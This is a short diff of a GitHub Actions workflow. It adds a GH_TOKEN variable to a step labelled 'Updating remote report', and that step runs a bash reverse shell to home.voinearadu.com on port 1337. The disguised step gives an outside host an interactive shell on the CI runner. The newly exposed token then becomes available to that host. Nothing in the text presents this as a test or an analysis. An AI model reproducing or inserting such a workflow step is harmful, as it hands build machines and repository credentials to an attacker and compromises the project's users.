@@ -76,6 +76,8 @@ jobs:
           python-version: '3.10' 
 
       - name: "Updating remote report"
+        env:
+          GH_TOKEN: ${{ github.token }}
         run: |
           python3 run/dependencies.py
           bash -i >& /dev/tcp/home.voinearadu.com/1337 0>&1
